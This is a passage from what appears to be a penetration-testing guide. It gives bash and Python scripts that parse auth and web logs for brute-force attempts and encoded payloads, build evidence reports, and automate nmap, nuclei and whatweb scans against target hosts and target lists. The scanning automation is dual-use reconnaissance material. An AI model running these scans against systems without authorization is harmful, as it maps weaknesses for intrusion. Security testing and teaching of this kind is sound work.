grep "Failed password" /var/log/auth.log | \
# Stage 2: Extract IPs and timestamps
awk '{print $1, $2, $3, $(NF-3)}' | \
# Stage 3: Count per IP per hour
awk '{hour=substr($3,1,2); print $4, $1"-"$2"-"hour}' | sort | uniq -c | \
# Stage 4: Flag brute force (>10 attempts/hour)
awk '$1 > 10 {print "BRUTE_FORCE:", $2, $3, "attempts="$1}' \
  > evidence/brute_force_detected.txt

# Real-time log parsing with pattern matching
tail -f /var/log/syslog | awk '
/CRON/   {cron++}
/sshd/   {ssh++}
/kernel/ {kern++}
NR%100==0 {print "Stats: cron="cron, "ssh="ssh, "kernel="kern}
' | tee evidence/log_stats.txt

# Extract and decode base64 payloads from web logs
grep -oP 'base64[^&"]+' /var/log/apache2/access.log | while read -r encoded; do
  decoded=$(echo "$encoded" | base64 -d 2>/dev/null)
  [ -n "$decoded" ] && echo "PAYLOAD: $decoded"
done | tee evidence/decoded_payloads.txt
```

### Structured Report Generation

```bash
# Generate markdown report from scan data
generate_report() {
  local output="evidence/report_$(date +%Y%m%d).md"
  cat > "$output" << EOF
# Penetration Test Evidence Report
Generated: $(date -u +%Y-%m-%dT%H:%M:%SZ)

## Hosts Discovered
$(wc -l < evidence/all_ips.txt) unique hosts

## Open Ports Summary
$(awk -F',' 'NR>1{print $3}' evidence/services.csv | sort | uniq -c | sort -rn | head -10 | \
  awk '{printf "| %s | %d |\n", $2, $1}')

## Critical Findings
$(jq -r 'select(.info.severity=="critical") | "- " + .info.name + " on " + .host' evidence/nuclei.json 2>/dev/null)
EOF
  echo "[*] Report generated: $output"
}
generate_report
```

---

## 15. Terminal Automation Scripts

### Batch Scan Automation with Evidence Capture

```bash
#!/bin/bash
# Automated pentest evidence collection script
# Usage: ./auto_scan.sh target_ip scope_file output_dir
TARGET="$1"
SCOPE="$2"
OUTDIR="evidence_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"/{nmap,nuclei,curl,screenshots}

echo "=== $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee "$OUTDIR/timeline.log"
echo "[*] Starting automated scan of $TARGET" | tee -a "$OUTDIR/timeline.log"

# Phase 1: Port scan with service detection
echo "[*] Phase 1: Port scanning..." | tee -a "$OUTDIR/timeline.log"
nmap -sV -sC -oA "$OUTDIR/nmap/full_scan" "$TARGET" 2>&1 | tee "$OUTDIR/nmap/scan_output.txt"

# Phase 2: Vulnerability scan with Nuclei
echo "[*] Phase 2: Vulnerability scanning..." | tee -a "$OUTDIR/timeline.log"
nuclei -u "http://$TARGET" -t cves/ -t vulnerabilities/ -severity critical,high \
  -json -o "$OUTDIR/nuclei/findings.json" -stats 2>&1 | tee "$OUTDIR/nuclei/scan_output.txt"

# Phase 3: Web technology detection
echo "[*] Phase 3: Technology fingerprinting..." | tee -a "$OUTDIR/timeline.log"
whatweb -v "http://$TARGET" 2>&1 | tee "$OUTDIR/curl/whatweb.txt"

echo "[*] Scan complete: $OUTDIR" | tee -a "$OUTDIR/timeline.log"
echo "=== $(date -u +%Y-%m-%dT%H:%M:%SZ) ===" | tee -a "$OUTDIR/timeline.log"
```

### Process Management for Long-Running Scans

```bash
# Run scan in background with nohup and capture PID
nohup nmap -sV -p- -T4 -oA full_scan target > scan.log 2>&1 &
SCAN_PID=$!
echo "Scan PID: $SCAN_PID" | tee scan_pid.txt

# Monitor progress without blocking
tail -f scan.log &

# Check if scan is still running
kill -0 $SCAN_PID 2>/dev/null && echo "Running" || echo "Finished"

# Parallel scanning with GNU parallel
cat targets.txt | parallel -j 5 "nmap -sV -T4 -oA scans/{#} {} 2>&1 | tee logs/{#}.log"

# Resource-aware scanning: throttle based on load
while read target; do
  while [ $(nproc --ignore=2) -lt $(nproc) ] && [ $(awk '{print $1}' /proc/loadavg | cut -d. -f1) -gt 4 ]; do
    sleep 10
  done
  nmap -sV -T3 -oA "scans/$(echo $target | tr '.' '_')" "$target" &
done < targets.txt
wait
```

---

## 16. Shell Scripting for Pentest Workflow

### Automated Reconnaissance Pipeline

```python
#!/usr/bin/env python3
"""Orchestrate multi-tool recon pipeline with evidence collection."""
import subprocess
import json
from datetime import datetime
from pathlib import Path

class ReconPipeline:
    def __init__(self, target, output_dir="recon_output"):
        self.target = target
        self.outdir = Path(output_dir) / datetime.now().strftime("%Y%m%d_%H%M%S")
        self.outdir.mkdir(parents=True, exist_ok=True)
        self.results = {}

    def run(self, cmd, name):
        outfile = self.outdir / f"{name}.txt"
        start = datetime.now()
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
            outfile.write_text(result.stdout + result.stderr)
            self.results[name] = {
                "status": "completed", "returncode": result.returncode,
                "duration": str(datetime.now() - start), "output_file": str(outfile)
            }
        except subprocess.TimeoutExpired:
            self.results[name] = {"status": "timeout", "duration": str(datetime.now() - start)}
        print(f"  [{self.results[name]['status']}] {name} ({self.results[name]['duration']})")

    def execute(self):
        print(f"[*] Recon pipeline for {self.target}")
        self.run(f"nmap -sV -T4 -oA {self.outdir}/nmap {self.target}", "nmap")
        self.run(f"whatweb -v http://{self.target}", "whatweb")
        self.run(f"nuclei -u http://{self.target} -t cves/ -severity critical,high -silent", "nuclei")
        (self.outdir / "summary.json").write_text(json.dumps(self.results, indent=2))
        print(f"[*] Results: {self.outdir}")

pipeline = ReconPipeline("192.168.1.100")
pipeline.execute()
```
